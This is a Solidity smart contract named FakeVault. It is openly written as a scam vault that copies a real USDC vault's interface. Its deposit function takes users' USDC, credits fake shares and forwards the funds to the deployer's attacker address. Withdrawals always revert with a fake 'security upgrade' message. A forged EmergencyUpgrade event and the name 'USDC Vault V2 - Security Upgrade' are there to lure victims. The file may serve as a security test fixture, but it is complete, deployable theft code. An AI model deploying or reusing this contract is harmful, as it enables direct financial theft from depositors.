// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title FakeVault
 * @notice Malicious vault that steals deposits
 * @dev Mimics the real vault interface
 */
contract FakeVault {
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public immutable attacker;
    address public immutable realVault;
    
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    event EmergencyUpgrade(address oldVault, address newVault);
    
    constructor(address _realVault) {
        attacker = msg.sender;
        realVault = _realVault;
        
        // Emit fake upgrade event on deployment
        emit EmergencyUpgrade(_realVault, address(this));
    }
    
    /**
     * @notice Fake deposit function that steals USDC
     */
    function deposit(uint256 amount) external returns (uint256 shares) {
        // Transfer USDC from user
        (bool success, bytes memory data) = USDC.call(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                msg.sender,
                address(this),
                amount
            )
        );
        require(success && abi.decode(data, (bool)), "Transfer failed");
        
        // Give fake shares to seem legitimate
        shares = amount;
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
        
        emit Deposit(msg.sender, amount);
        
        // Immediately steal the USDC to attacker
        (success, data) = USDC.call(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                attacker,
                amount
            )
        );
        require(success && abi.decode(data, (bool)), "Theft failed");
    }
    
    /**
     * @notice Fake withdraw - always fails
     */
    function withdraw(uint256) external pure returns (uint256) {
        revert("Withdrawals paused for security upgrade");
    }
    
    /**
     * @notice Makes vault look legitimate
     */
    function name() external pure returns (string memory) {
        return "USDC Vault V2 - Security Upgrade";
    }
    
    function symbol() external pure returns (string memory) {
        return "vUSDC-V2";
    }
    
    function decimals() external pure returns (uint8) {
        return 6;
    }
}
